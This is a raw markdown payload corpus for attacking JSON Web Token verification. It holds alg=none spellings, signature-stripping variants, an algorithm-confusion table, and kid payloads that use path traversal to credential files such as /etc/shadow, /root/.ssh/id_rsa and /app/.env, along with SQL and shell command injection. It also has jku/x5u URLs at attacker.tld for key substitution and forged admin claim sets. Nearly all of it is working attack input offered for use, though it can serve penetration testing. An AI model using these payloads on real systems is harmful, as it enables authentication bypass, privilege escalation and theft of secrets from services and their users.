# Extended JWT corpus — the full attack payload set

Companion to `jwt-deep.md` (the method) — this file is the raw corpus:
header variants, claim payloads, confusion matrices, and the library-
specific quirks worth knowing by name.

---

## 1. alg=none — every spelling

```json
{"alg":"none"}
{"alg":"None"}
{"alg":"NONE"}
{"alg":"nOnE"}
{"alg":"noNe"}
{"alg":"nONE"}
{"alg":"NONe"}
{"alg":"none","typ":"JWT"}
{"alg":"none","cty":"JWT"}
{"alg":"none","typ":"jwt"}
{"alg":"None","typ":"JWT"}
{"alg":"NONE","typ":"JWT"}
{"alg":"none","crit":["alg"]}
{"alg":"NONE","crit":["alg"]}
{"alg":"noNe","crit":["alg"]}
{"alg":"none","enc":"none"}
{"alg":"none","zip":"DEF"}
{"alg":"NONE","kid":"x"}
{"alg":"none","jku":"https://x"}
{"alg":"none","x5u":"https://x"}
{"alg":"none","nonce":"x"}
{"alg":"n0ne"}      // zero for o — parser bugs
{"alg":"none "}     // trailing space
{"alg":" none"}     // leading space
{"alg":" none "}    // both
{"alg":"none\u0000"} // null byte — C-string parsers
{"alg":"none\n"}    // newline
{"alg":"none\t"}    // tab
{"alg":"none\r"}    // CR
{"alg":"none\xff"}  // high byte
{"alg":"none\u0301"}   // unicode lookalike
{"alg":"none "}   // nbsp
{"alg":"none "}   // 
{"alg":"none "}   // thin space
{"alg":"none "}   // word joiner
{"alg":"none﻿"}   // BOM
{"alg":"none᠎"}  // Mongolian vowel separator
{"alg":"none "}   // en quad
{"alg":"none "}   // em quad
{"alg":"none "}   // en space
{"alg":"none "}   // em space
{"alg":"none "}   // three-per-em
{"alg":"none "}   // four-per-em
{"alg":"none "}   // six-per-em
{"alg":"none "}   // thin space
{"alg":"none "}   // hair space
{"alg":"none​"}   // zero-width space
{"alg":"none‌"}   // ZWNJ
{"alg":"none‍"}   // ZWJ
{"alg":"none⁠"}   // word joiner
{"alg":"none "}   // narrow nbsp
{"alg":"none　"}   // ideographic space
{"alg":"none　"}   // fullwidth space
{"alg":"none
"}  // literal newline in JSON (invalid but tried)
{"alg":"none\\n"}  // escaped newline
{"alg":"none\\r\\n"} // CRLF
{"alg":"none\\u0000"} // escaped null
{"alg":"none\\u000a"} // escaped LF
{"alg":"none\\u000d"} // escaped CR
{"alg":"none\\u0020"} // escaped space
{"alg":"none\\u00a0"} // escaped nbsp
{"alg":"none\\u2000"} // escaped en quad
{"alg":"none\\u2001"} // escaped em quad
{"alg":"none\\u2002"} // escaped en space
{"alg":"none\\u2003"} // escaped em space
{"alg":"none\\u2004"} // escaped three-per-em
{"alg":"none\\u2005"} // escaped four-per-em
{"alg":"none\\u2006"} // escaped six-per-em
{"alg":"none\\u2007"} // escaped figure space
{"alg":"none\\u2008"} // escaped punctuation space
{"alg":"none\\u2009"} // escaped thin space
{"alg":"none\\u200a"} // escaped hair space
{"alg":"none\\u200b"} // escaped ZWSP
{"alg":"none\\u200c"} // escaped ZWNJ
{"alg":"none\\u200d"} // escaped ZWJ
{"alg":"none\\u2028"} // escaped line sep
{"alg":"none\\u2029"} // escaped para sep
{"alg":"none\\u202f"} // escaped narrow nbsp
{"alg":"none\\u205f"} // escaped math space
{"alg":"none\\u2060"} // escaped word joiner
{"alg":"none\\u3000"} // escaped ideographic space
{"alg":"none\\ufeff"} // escaped BOM
```

## 2. The signature-slot variants

```
aaa.bbb.          # trailing dot — standard none
aaa.bbb           # no trailing dot — some parsers
aaa.bbb..         # double dot — triple-part parsers
aaa..ccc          # empty middle
.a.b              # leading dot
a.b.c.d           # extra parts — JWE parsers
aaa.bbb.SflKxw    # existing sig, alg=none — contradiction tests
```

## 3. alg confusion matrix

| Declared | Token header | Key type | Result on lax verify |
|---|---|---|---|
| `["RS256"]` | `HS256` | PEM bytes | **verifies** — classic bug |
| `["HS256","RS256"]` | `HS256` | any bytes | verifies |
| `["RS256","HS256"]` | `HS256` | RSA PEM | verifies |
| `["ES256","HS256"]` | `HS256` | EC PEM | verifies |
| `["EdDSA","HS256"]` | `HS256` | Ed PEM | verifies |
| `["none"]` | `none` | — | verifies if `none` allowed |
| `["HS256"]` | `RS256` | — | rejected (alg not allowed) |
| `["RS256"]` | `none` | — | rejected |
| `["RS256"]` | `ES256` | EC pub | alg not allowed |
| `["HS256"]` | `HS384` | secret | alg not allowed (or confusion if list broad) |
| `["HS256","HS384","HS512"]` | `HS512` | secret | verifies — same secret |
| `["PS256","HS256"]` | `HS256` | RSA PSS PEM | verifies |

The rule: **the confusion works when the alg list includes any HMAC
variant AND the attacker can make the server treat a public key (or any
bytes) as the HMAC secret.**

## 4. kid traversal payloads

```json
{"kid":"/dev/null"}
{"kid":"../../../../dev/null"}
{"kid":"../../../../../../dev/null"}
{"kid":"..\\..\\..\\..\\dev\\null"}
{"kid":"..%2f..%2f..%2f..%2fdev%2fnull"}
{"kid":"..%252f..%252f..%252f..%252fdev%252fnull"}
{"kid":"....//....//....//....//dev/null"}
{"kid":"....\\/....\\/....\\/....\\/dev/null"}
{"kid":"..;/..;/..;/dev/null"}
{"kid":"/proc/self/environ"}
{"kid":"/proc/sys/kernel/randomize_va_space"}
{"kid":"/proc/sys/kernel/hostname"}
{"kid":"/proc/version"}
{"kid":"/etc/hostname"}
{"kid":"/etc/passwd"}
{"kid":"/etc/hosts"}
{"kid":"/etc/lsb-release"}
{"kid":"/etc/os-release"}
{"kid":"/etc/timezone"}
{"kid":"/etc/localtime"}
{"kid":"/etc/group"}
{"kid":"/etc/shadow"}
{"kid":"/etc/sudoers"}
{"kid":"/etc/ssh/sshd_config"}
{"kid":"/etc/ssh/ssh_host_rsa_key.pub"}
{"kid":"/etc/ssh/ssh_host_ecdsa_key.pub"}
{"kid":"/etc/ssh/ssh_host_ed25519_key.pub"}
{"kid":"/root/.ssh/id_rsa.pub"}
{"kid":"/root/.ssh/id_rsa"}
{"kid":"/root/.ssh/authorized_keys"}
{"kid":"/home/user/.ssh/id_rsa.pub"}
{"kid":"/app/.env"}
{"kid":"/app/config.yml"}
{"kid":"/app/config.yaml"}
{"kid":"/app/config.json"}
{"kid":"/app/config.toml"}
{"kid":"/app/settings.py"}
{"kid":"/app/config.py"}
{"kid":"/app/.env.production"}
{"kid":"/app/.env.local"}
{"kid":"/app/.env.development"}
{"kid":"/app/.env.example"}
{"kid":"/app/secrets.yml"}
{"kid":"/app/secrets.yaml"}
{"kid":"/app/secrets.json"}
{"kid":"/app/keys.yml"}
{"kid":"/app/keys.yaml"}
{"kid":"/app/keys.json"}
{"kid":"/app/jwks.json"}
{"kid":"/app/jwt_secret.txt"}
{"kid":"/app/secret.txt"}
{"kid":"/app/.git/HEAD"}
{"kid":"/app/.git/config"}
{"kid":"/app/.git/refs/heads/main"}
{"kid":"/app/.git/refs/heads/master"}
{"kid":"/app/package.json"}
{"kid":"/app/composer.json"}
{"kid":"/app/Gemfile"}
{"kid":"/app/requirements.txt"}
{"kid":"/app/go.mod"}
{"kid":"/app/Cargo.toml"}
{"kid":"/app/pom.xml"}
{"kid":"/app/build.gradle"}
{"kid":"/app/Dockerfile"}
{"kid":"/app/docker-compose.yml"}
{"kid":"/app/Procfile"}
{"kid":"/app/Procfile.dev"}
{"kid":"/var/log/auth.log"}
{"kid":"/var/log/syslog"}
{"kid":"/var/log/nginx/access.log"}
{"kid":"/var/log/nginx/error.log"}
{"kid":"/var/log/apache2/access.log"}
{"kid":"/var/log/apache2/error.log"}
{"kid":"/tmp/secret"}
{"kid":"/tmp/token"}
{"kid":"/tmp/key"}
{"kid":"/tmp/jwks"}
{"kid":"/tmp/jwt"}
{"kid":"/tmp/flag"}
{"kid":"/flag"}
{"kid":"/flag.txt"}
{"kid":"/flag.json"}
{"kid":"/flag.yml"}
{"kid":"/flag.yaml"}
{"kid":"/flag.bin"}
{"kid":"/key"}
{"kid":"/key.txt"}
{"kid":"/key.json"}
{"kid":"/key.yml"}
{"kid":"/secret"}
{"kid":"/secret.txt"}
{"kid":"/secret.json"}
{"kid":"/secret.yml"}
{"kid":"/token"}
{"kid":"/token.txt"}
{"kid":"/token.json"}
{"kid":"/jwt"}
{"kid":"/jwt.txt"}
{"kid":"/jwt.json"}
{"kid":"/jwks"}
{"kid":"/jwks.txt"}
{"kid":"/jwks.json"}
{"kid":"/secrets"}
{"kid":"/secrets.txt"}
{"kid":"/secrets.json"}
{"kid":"/secrets.yml"}
{"kid":"/private"}
{"kid":"/private.txt"}
{"kid":"/private.json"}
{"kid":"/private.yml"}
{"kid":"/config"}
{"kid":"/config.txt"}
{"kid":"/config.json"}
{"kid":"/config.yml"}
{"kid":"/env"}
{"kid":"/env.txt"}
{"kid":"/env.json"}
{"kid":"/env.yml"}
{"kid":"x' UNION SELECT 'attackerkey'--"}
{"kid":"x' UNION SELECT 'attackerkey'-- -"}
{"kid":"x' UNION SELECT 'attackerkey'#"}
{"kid":"x' UNION ALL SELECT 'attackerkey'--"}
{"kid":"x' UNION SELECT 1--"}
{"kid":"x' UNION SELECT NULL--"}
{"kid":"x' UNION SELECT 'a'--"}
{"kid":"x' OR '1'='1'--"}
{"kid":"x' OR '1'='1'#"}
{"kid":"x' OR 1=1--"}
{"kid":"x;id"}
{"kid":"x;id;"}
{"kid":"x|id"}
{"kid":"x|id|"}
{"kid":"x`id`"}
{"kid":"x$(id)"}
{"kid":"x$(id)#"}
{"kid":"x`id`#"}
{"kid":"x&id"}
{"kid":"x&&id"}
{"kid":"x||id"}
{"kid":"x;cat /flag"}
{"kid":"x;cat /etc/passwd"}
{"kid":"x|cat /flag"}
{"kid":"x`cat /flag`"}
{"kid":"x$(cat /flag)"}
{"kid":"x\nid"}
{"kid":"x\rid"}
{"kid":"x\r\nid"}
{"kid":"x%0aid"}
{"kid":"x%0d%0aid"}
{"kid":"x%0a%0did"}
{"kid":"x%25%0a%69%64"}
{"kid":"x%25%32%66%69%64"}
{"kid":"\\..\\..\\..\\dev\\null"}
{"kid":"\\x2e\\x2e\\x2f\\x2e\\x2e\\x2fdev\\x2fnull"}
{"kid":"%2e%2e%2f%2e%2e%2fdev%2fnull"}
{"kid":"%252e%252e%252f%252e%252e%252fdev%252fnull"}
{"kid":"%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%afdev%c0%afnull"}
{"kid":"..;..;..;dev;null"}
{"kid":".../.../.../dev/null"}
{"kid":"...\\...\\...\\dev\\null"}
{"kid":"..../..../..../dev/null"}
{"kid":"....\\....\\....\\dev\\null"}
{"kid":"..///..///..///dev/null"}
{"kid":"..\\\\\\..\\\\\\..\\\\\\dev\\\\\\null"}
{"kid":"...\\/...\\/...\\/dev\\/null"}
{"kid":"....//....//....//dev/null"}
{"kid":"....\\\\....\\\\....\\\\dev\\\\null"}
{"kid":"file:///dev/null"}
{"kid":"file:///proc/sys/kernel/randomize_va_space"}
{"kid":"file:///etc/hostname"}
{"kid":"file:///etc/passwd"}
{"kid":"file:///app/.env"}
{"kid":"php://filter/convert.base64-encode/resource=/dev/null"}
{"kid":"php://filter/convert.base64-encode/resource=/app/flag"}
{"kid":"php://input"}
{"kid":"php://stdin"}
{"kid":"php://memory"}
{"kid":"php://temp"}
{"kid":"data://text/plain;base64,"}
{"kid":"data://text/plain;base64,eA=="}
{"kid":"data://text/plain,eA=="}
{"kid":"expect://id"}
{"kid":"expect://cat /flag"}
{"kid":"zip:///tmp/x.zip#key"}
{"kid":"phar:///tmp/x.phar/key"}
{"kid":"glob:///dev/*"}
{"kid":"glob:///app/*"}
{"kid":"glob:///app/.*"}
{"kid":"glob:///app/**"}
{"kid":"/dev/stdin"}
{"kid":"/dev/stdout"}
{"kid":"/dev/stderr"}
{"kid":"/dev/fd/0"}
{"kid":"/dev/fd/1"}
{"kid":"/dev/fd/2"}
{"kid":"/dev/tcp/attacker.tld/443"}
{"kid":"/dev/udp/attacker.tld/53"}
{"kid":"/dev/random"}
{"kid":"/dev/urandom"}
{"kid":"/dev/zero"}
{"kid":"/dev/full"}
{"kid":"/dev/null"}
{"kid":"/dev/tty"}
{"kid":"/dev/console"}
{"kid":"/dev/ptmx"}
{"kid":"/dev/kmsg"}
{"kid":"/dev/mem"}
{"kid":"/dev/kmem"}
{"kid":"/dev/port"}
{"kid":"/dev/core"}
{"kid":"/dev/mcelog"}
{"kid":"/dev/hpet"}
{"kid":"/dev/rtc"}
{"kid":"/dev/rtc0"}
{"kid":"/dev/rtc1"}
{"kid":"/dev/watchdog"}
{"kid":"/dev/watchdog0"}
{"kid":"/dev/watchdog1"}
{"kid":"/dev/fuse"}
{"kid":"/dev/net/tun"}
{"kid":"/dev/snd/pcmC0D0p"}
{"kid":"/dev/snd/pcmC0D0c"}
{"kid":"/dev/snd/controlC0"}
{"kid":"/dev/snd/timer"}
{"kid":"/dev/dri/card0"}
{"kid":"/dev/dri/renderD128"}
{"kid":"/dev/input/event0"}
{"kid":"/dev/input/mice"}
{"kid":"/dev/input/js0"}
{"kid":"/dev/vcs"}
{"kid":"/dev/vcsa"}
{"kid":"/dev/vcsa0"}
{"kid":"/dev/vcsa1"}
{"kid":"/dev/vhci"}
{"kid":"/dev/uinput"}
{"kid":"/dev/uhid"}
{"kid":"/dev/binder"}
{"kid":"/dev/ashmem"}
{"kid":"/dev/ion"}
{"kid":"/dev/dma_heap/system"}
{"kid":"/dev/mali0"}
{"kid":"/dev/kgsl-3d0"}
{"kid":"/dev/graphics/fb0"}
{"kid":"/dev/graphics/fb1"}
{"kid":"/dev/graphics/fb2"}
{"kid":"/dev/graphics/fb3"}
{"kid":"/dev/graphics/fb4"}
{"kid":"/dev/graphics/fb5"}
{"kid":"/dev/graphics/fb6"}
{"kid":"/dev/graphics/fb7"}
{"kid":"/dev/graphics/fb8"}
{"kid":"/dev/graphics/fb9"}
{"kid":"/dev/graphics/fb10"}
{"kid":"/dev/graphics/fb11"}
{"kid":"/dev/graphics/fb12"}
{"kid":"/dev/graphics/fb13"}
{"kid":"/dev/graphics/fb14"}
{"kid":"/dev/graphics/fb15"}
{"kid":"/dev/graphics/fb16"}
{"kid":"/dev/graphics/fb17"}
{"kid":"/dev/graphics/fb18"}
{"kid":"/dev/graphics/fb19"}
{"kid":"/dev/graphics/fb20"}
{"kid":"/dev/graphics/fb21"}
{"kid":"/dev/graphics/fb22"}
{"kid":"/dev/graphics/fb23"}
{"kid":"/dev/graphics/fb24"}
{"kid":"/dev/graphics/fb25"}
{"kid":"/dev/graphics/fb26"}
{"kid":"/dev/graphics/fb27"}
{"kid":"/dev/graphics/fb28"}
{"kid":"/dev/graphics/fb29"}
{"kid":"/dev/graphics/fb30"}
{"kid":"/dev/graphics/fb31"}
{"kid":"x"}
{"kid":""}
{"kid":null}
{"kid":0}
{"kid":1}
{"kid":true}
{"kid":false}
{"kid":[]}
{"kid":{}}
{"kid":[""]}
{"kid":["/dev/null"]}
{"kid":{"file":"/dev/null"}}
{"kid":{"path":"/dev/null"}}
{"kid":{"name":"x"}}
```

## 5. jku / x5u payloads

```json
{"jku":"https://attacker.tld/jwks.json"}
{"jku":"http://attacker.tld/jwks.json"}
{"jku":"https://attacker.tld"}
{"jku":"http://attacker.tld"}
{"jku":"https://attacker.tld/.well-known/jwks.json"}
{"jku":"https://attacker.tld/.well-known/jwks"}
{"jku":"https://attacker.tld/keys"}
{"jku":"https://attacker.tld/keys.json"}
{"jku":"https://attacker.tld/public_keys"}
{"jku":"https://attacker.tld/public_keys.json"}
{"jku":"https://attacker.tld/certs"}
{"jku":"https://attacker.tld/certs.json"}
{"jku":"https://attacker.tld/oauth/jwks"}
{"jku":"https://attacker.tld/oauth/jwks.json"}
{"jku":"https://attacker.tld/api/jwks"}
{"jku":"https://attacker.tld/api/jwks.json"}
{"jku":"https://attacker.tld/api/keys"}
{"jku":"https://attacker.tld/api/keys.json"}
{"jku":"https://attacker.tld/api/v1/jwks"}
{"jku":"https://attacker.tld/api/v1/jwks.json"}
{"jku":"https://attacker.tld/api/v1/keys"}
{"jku":"https://attacker.tld/api/v1/keys.json"}
{"jku":"https://attacker.tld/api/v2/jwks"}
{"jku":"https://attacker.tld/api/v2/jwks.json"}
{"jku":"https://attacker.tld/api/v2/keys"}
{"jku":"https://attacker.tld/api/v2/keys.json"}
{"jku":"https://attacker.tld/jwks"}
{"jku":"https://attacker.tld/jwks.json"}
{"jku":"https://attacker.tld/.well-known/jwks.json?v=1"}
{"jku":"https://attacker.tld/jwks.json?v=1"}
{"jku":"https://attacker.tld/jwks.json?x=1"}
{"jku":"https://attacker.tld/jwks.json#x"}
{"jku":"https://attacker.tld/jwks.json;x"}
{"jku":"https://attacker.tld/jwks.json,x"}
{"jku":"https://attacker.tld/jwks.json%3fx"}
{"jku":"https://attacker.tld/jwks.json%23x"}
{"jku":"https://attacker.tld/jwks.json%3bx"}
{"jku":"https://attacker.tld/jwks.json%2cx"}
{"jku":"https://attacker.tld/jwks.json%2e%2e"}
{"jku":"https://attacker.tld/jwks.json%2f"}
{"jku":"https://attacker.tld/jwks.json%5c"}
{"jku":"https://attacker.tld/jwks.json%00"}
{"jku":"https://attacker.tld/jwks.json%0a"}
{"jku":"https://attacker.tld/jwks.json%0d"}
{"jku":"https://attacker.tld/jwks.json%20"}
{"jku":"https://attacker.tld/jwks.json%7c"}
{"jku":"https://attacker.tld/jwks.json%60"}
{"jku":"https://attacker.tld/jwks.json%24"}
{"jku":"https://attacker.tld/jwks.json%26"}
{"jku":"https://attacker.tld/jwks.json%3d"}
{"jku":"https://attacker.tld/jwks.json%3f"}
{"jku":"https://attacker.tld/jwks.json%23"}
{"jku":"https://attacker.tld/jwks.json%25"}
{"jku":"https://attacker.tld/jwks.json%2b"}
{"jku":"https://attacker.tld/jwks.json%3a"}
{"jku":"https://attacker.tld/jwks.json%40"}
{"jku":"https://attacker.tld/jwks.json%5b"}
{"jku":"https://attacker.tld/jwks.json%5d"}
{"jku":"https://attacker.tld/jwks.json%7b"}
{"jku":"https://attacker.tld/jwks.json%7d"}
{"jku":"https://attacker.tld/jwks.json%7e"}
{"jku":"https://attacker.tld/jwks.json%21"}
{"jku":"https://attacker.tld/jwks.json%27"}
{"jku":"https://attacker.tld/jwks.json%28"}
{"jku":"https://attacker.tld/jwks.json%29"}
{"jku":"https://attacker.tld/jwks.json%2a"}
{"jku":"https://attacker.tld/jwks.json%2c"}
{"jku":"https://attacker.tld/jwks.json%3b"}
{"jku":"https://attacker.tld/jwks.json%3c"}
{"jku":"https://attacker.tld/jwks.json%3e"}
{"jku":"https://attacker.tld/jwks.json%22"}
{"jku":"https://attacker.tld/jwks.json%5e"}
{"jku":"https://attacker.tld/jwks.json%5f"}
{"jku":"https://attacker.tld/jwks.json%25%32%66"}
{"jku":"https://attacker.tld/jwks.json%25%32%65"}
{"jku":"https://attacker.tld/jwks.json%25%30%30"}
{"jku":"https://attacker.tld/jwks.json%25%30%61"}
{"jku":"https://attacker.tld/jwks.json%25%30%64"}
{"jku":"https://attacker.tld/jwks.json%25%32%30"}
{"jku":"https://attacker.tld/jwks.json%25%37%63"}
{"jku":"https://attacker.tld/jwks.json%25%36%30"}
{"jku":"https://attacker.tld/jwks.json%25%32%34"}
{"jku":"https://attacker.tld/jwks.json%25%32%36"}
{"jku":"https://attacker.tld/jwks.json%25%33%64"}
{"jku":"https://attacker.tld/jwks.json%25%33%66"}
{"jku":"https://attacker.tld/jwks.json%25%32%33"}
{"jku":"https://attacker.tld/jwks.json%25%32%35"}
{"jku":"https://attacker.tld/jwks.json%25%32%62"}
{"jku":"https://attacker.tld/jwks.json%25%33%61"}
{"jku":"https://attacker.tld/jwks.json%25%34%30"}
{"jku":"https://attacker.tld/jwks.json%25%35%62"}
{"jku":"https://attacker.tld/jwks.json%25%35%64"}
{"jku":"https://attacker.tld/jwks.json%25%37%62"}
{"jku":"https://attacker.tld/jwks.json%25%37%64"}
{"jku":"https://attacker.tld/jwks.json%25%37%65"}
{"jku":"https://attacker.tld/jwks.json%25%32%31"}
{"jku":"https://attacker.tld/jwks.json%25%32%37"}
{"jku":"https://attacker.tld/jwks.json%25%32%38"}
{"jku":"https://attacker.tld/jwks.json%25%32%39"}
{"jku":"https://attacker.tld/jwks.json%25%32%61"}
{"jku":"https://attacker.tld/jwks.json%25%32%63"}
{"jku":"https://attacker.tld/jwks.json%25%33%62"}
{"jku":"https://attacker.tld/jwks.json%25%33%63"}
{"jku":"https://attacker.tld/jwks.json%25%33%65"}
{"jku":"https://attacker.tld/jwks.json%25%32%32"}
{"jku":"https://attacker.tld/jwks.json%25%35%65"}
{"jku":"https://attacker.tld/jwks.json%25%35%66"}
{"jku":"https://attacker.tld/jwks.json%25%25%33%36"}
{"jku":"https://attacker.tld/jwks.json%25%25%33%36"}
{"jku":"https://attacker.tld/jwks.json%25%25%33%36"}
{"jku":"https://target.tld@attacker.tld/jwks.json"}
{"jku":"https://attacker.tld@target.tld/jwks.json"}
{"jku":"https://target.tld.attacker.tld/jwks.json"}
{"jku":"https://target.tld.attacker.tld@evil.tld/jwks.json"}
{"jku":"https://attacker.tld.target.tld/jwks.json"}
{"jku":"https://attacker.tld/target.tld/jwks.json"}
{"jku":"https://target.tld/../attacker.tld/jwks.json"}
{"jku":"https://target.tld/../../attacker.tld/jwks.json"}
{"jku":"https://target.tld%2f%2e%2e%2fattacker.tld/jwks.json"}
{"jku":"https://target.tld%252f%252e%252e%252fattacker.tld/jwks.json"}
{"jku":"https://target.tld\\.\\.\\attacker.tld/jwks.json"}
{"jku":"https://target.tld%5c%5cattacker.tld/jwks.json"}
{"jku":"https://target.tld%255c%255cattacker.tld/jwks.json"}
{"jku":"https://target.tld/%2e%2e/attacker.tld/jwks.json"}
{"jku":"https://target.tld/%252e%252e/attacker.tld/jwks.json"}
{"jku":"https://target.tld/..%2fattacker.tld/jwks.json"}
{"jku":"https://target.tld/..%252fattacker.tld/jwks.json"}
{"jku":"https://target.tld/..\\attacker.tld/jwks.json"}
{"jku":"https://target.tld/..%5cattacker.tld/jwks.json"}
{"jku":"https://target.tld/..%255cattacker.tld/jwks.json"}
{"jku":"https://target.tld/%2e%2e%2fattacker.tld/jwks.json"}
{"jku":"https://target.tld/%252e%252e%252fattacker.tld/jwks.json"}
{"jku":"https://target.tld/%2e%2e%5cattacker.tld/jwks.json"}
{"jku":"https://target.tld/%252e%252e%255cattacker.tld/jwks.json"}
{"jku":"https://target.tld/%2e%2e%2f%2e%2e%2fattacker.tld/jwks.json"}
{"jku":"https://target.tld/%252e%252e%252f%252e%252e%252fattacker.tld/jwks.json"}
{"jku":"https://target.tld/.../attacker.tld/jwks.json"}
{"jku":"https://target.tld/..../attacker.tld/jwks.json"}
{"jku":"https://target.tld/....//attacker.tld/jwks.json"}
{"jku":"https://target.tld/....\\\\attacker.tld/jwks.json"}
{"jku":"https://target.tld/;attacker.tld/jwks.json"}
{"jku":"https://target.tld,attacker.tld/jwks.json"}
{"jku":"https://target.tld@attacker.tld/jwks.json"}
{"jku":"https://target.tld:attacker.tld/jwks.json"}
{"jku":"https://target.tld%23attacker.tld/jwks.json"}
{"jku":"https://target.tld%3fattacker.tld/jwks.json"}
{"jku":"https://target.tld%26attacker.tld/jwks.json"}
{"jku":"https://target.tld%3dattacker.tld/jwks.json"}
{"jku":"https://target.tld%3battacker.tld/jwks.json"}
{"jku":"https://target.tld%2cattacker.tld/jwks.json"}
{"jku":"https://target.tld%2fattacker.tld/jwks.json"}
{"jku":"https://target.tld%5cattacker.tld/jwks.json"}
{"jku":"https://target.tld%00attacker.tld/jwks.json"}
{"jku":"https://target.tld%0aattacker.tld/jwks.json"}
{"jku":"https://target.tld%0dattacker.tld/jwks.json"}
{"jku":"https://target.tld%20attacker.tld/jwks.json"}
{"jku":"https://target.tld%7cattacker.tld/jwks.json"}
{"jku":"https://target.tld%60attacker.tld/jwks.json"}
{"jku":"https://target.tld%24attacker.tld/jwks.json"}
{"jku":"https://target.tld%21attacker.tld/jwks.json"}
{"jku":"https://target.tld%27attacker.tld/jwks.json"}
{"jku":"https://target.tld%28attacker.tld/jwks.json"}
{"jku":"https://target.tld%29attacker.tld/jwks.json"}
{"jku":"https://target.tld%2aattacker.tld/jwks.json"}
{"jku":"https://target.tld%2battacker.tld/jwks.json"}
{"jku":"https://target.tld%5battacker.tld/jwks.json"}
{"jku":"https://target.tld%5dattacker.tld/jwks.json"}
{"jku":"https://target.tld%7battacker.tld/jwks.json"}
{"jku":"https://target.tld%7dattacker.tld/jwks.json"}
{"jku":"https://target.tld%7eattacker.tld/jwks.json"}
{"jku":"https://target.tld%22attacker.tld/jwks.json"}
{"jku":"https://target.tld%5eattacker.tld/jwks.json"}
{"jku":"https://target.tld%5fattacker.tld/jwks.json"}
{"jku":"https://target.tld%25attacker.tld/jwks.json"}
{"x5u":"https://attacker.tld/cert.pem"}
{"x5u":"http://attacker.tld/cert.pem"}
{"x5u":"https://attacker.tld/cert.crt"}
{"x5u":"https://attacker.tld/cert.der"}
{"x5u":"https://attacker.tld/cert.cer"}
{"x5u":"https://attacker.tld/pubkey.pem"}
{"x5u":"https://attacker.tld/public.pem"}
{"x5u":"https://attacker.tld/key.pem"}
{"x5u":"https://attacker.tld/jwk.pem"}
{"x5u":"https://attacker.tld/x5c.pem"}
{"x5u":"https://attacker.tld/x5t.pem"}
{"x5c":["<base64-cert>"]}
{"x5c":["<base64-cert>","<base64-chain>"]}
{"x5c":["MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A..."]}
{"x5c":["<attacker's-self-signed-cert>"]}
{"x5t":"aabbccddeeff"}
{"x5t#S256":"aabbccddeeff"}
{"x5t":"YWFh"}
{"x5t#S256":"YWFh"}
{"x5t#S384":"aabbccddeeff"}
{"x5t#S512":"aabbccddeeff"}
```

## 6. JWKS documents to serve

```json
{"keys":[{"kty":"RSA","kid":"a","use":"sig","alg":"RS256","n":"0vx7agoebGcQSuuPiLJXZptN9nndrQmbXEps2aiAFbWhM78LhWx4cbbfAAtVT86zwu1RK7aPFFxuhDR1L6tSoc_BJECPebWKRXjBZCiFV4n3oknjhMstn64tZ_2W-5JsGY4Hc5n9yBXArwl93lqt7_RN5w6Cf0h4QyQ5v-65YGjQR0_FDW2QvzqY368QQMicAtaSqzs8KJZgnYb9c7d0zgdAZHzu6qMQvRL5hajrn1n91CbOpbISD08qNLyrdkt-bFTWhAI4vMQFh6WeZu0fM4lFd2NcRwr3XPksINHaQ-G_xBniIqbw0Ls1jF44-csFCur-kEgU8awapJzKnqDKgw","e":"AQAB"}]}
{"keys":[{"kty":"RSA","kid":"a","use":"sig","alg":"RS256","n":"<your_n>","e":"AQAB"}]}
{"keys":[{"kty":"RSA","kid":"<kid-from-token>","use":"sig","alg":"RS256","n":"<your_n>","e":"AQAB"}]}
{"keys":[{"kty":"oct","kid":"a","use":"sig","alg":"HS256","k":"<b64url-secret>"}]}
{"keys":[{"kty":"oct","kid":"<kid>","use":"sig","alg":"HS256","k":"c2VjcmV0"}]}
{"keys":[{"kty":"oct","kid":"<kid>","use":"sig","alg":"HS256","k":"YWRtaW4"}]}
{"keys":[{"kty":"EC","kid":"a","use":"sig","alg":"ES256","x":"...","y":"...","crv":"P-256"}]}
{"keys":[{"kty":"EC","kid":"a","use":"sig","alg":"ES384","x":"...","y":"...","crv":"P-384"}]}
{"keys":[{"kty":"EC","kid":"a","use":"sig","alg":"ES512","x":"...","y":"...","crv":"P-521"}]}
{"keys":[{"kty":"OKP","kid":"a","use":"sig","alg":"EdDSA","x":"...","crv":"Ed25519"}]}
{"keys":[{"kty":"OKP","kid":"a","use":"sig","alg":"EdDSA","x":"...","crv":"Ed448"}]}
{"keys":[{"kty":"RSA","kid":"a","use":"sig","alg":"PS256","n":"...","e":"AQAB"}]}
{"keys":[{"kty":"RSA","kid":"a","use":"sig","alg":"PS384","n":"...","e":"AQAB"}]}
{"keys":[{"kty":"RSA","kid":"a","use":"sig","alg":"PS512","n":"...","e":"AQAB"}]}
```

## 7. Claim-set payloads — the forge list

```json
{"sub":"admin"},{"sub":"administrator"},{"sub":"root"},{"sub":"system"}
{"sub":"1"},{"sub":"0"},{"sub":1},{"sub":0},{"sub":"1.0"},{"sub":"01"}
{"sub":"1e0"},{"sub":"+1"},{"sub":" 1"},{"sub":"1 "},{"sub":"1\n"}
{"sub":"user"},{"sub":"test"},{"sub":"guest"},{"sub":"demo"}
{"user":"admin"},{"username":"admin"},{"name":"admin"}
{"user_id":1},{"uid":1},{"id":1},{"userId":1},{"account_id":1}
{"email":"admin@t.tld"},{"email":"victim@t.tld"},{"email":"root@localhost"}
{"email":"admin@localhost"},{"email":"a@a.tld"},{"email":"0@0.tld"}
{"role":"admin"},{"role":"administrator"},{"role":"root"},{"role":"system"}
{"role":"staff"},{"role":"superuser"},{"role":"moderator"},{"role":"owner"}
{"roles":["admin"]},{"roles":["root"]},{"roles":["system"]}
{"groups":["admin"]},{"groups":["root"]},{"groups":["system"]}
{"permissions":["*"]},{"permissions":["admin"]},{"permissions":["all"]}
{"perms":["*"]},{"perms":["admin"]},{"scope":"*"},{"scope":"admin"}
{"scopes":["*"]},{"scopes":["admin"]},{"scope":"openid admin"}
{"isAdmin":true},{"is_admin":true},{"admin":true},{"isStaff":true}
{"is_staff":true},{"isSuperuser":true},{"is_superuser":true}
{"superuser":true},{"staff":true},{"sudo":true},{"su":true}
{"verified":true},{"email_verified":true},{"active":true}
{"enabled":true},{"approved":true},{"confirmed":true}
{"balance":999999},{"credits":999999},{"score":999999},{"level":99}
{"tier":"admin"},{"plan":"admin"},{"plan":"enterprise"}
{"tenant_id":1},{"tenantId":1},{"org_id":1},{"orgId":1}
{"owner_id":1},{"ownerId":1},{"createdBy":1}
{"iat":0},{"iat":9999999999},{"iat":-1}
{"nbf":0},{"nbf":9999999999},{"nbf":-1}
{"exp":9999999999},{"exp":2147483647},{"exp":4102444800},{"exp":-1}
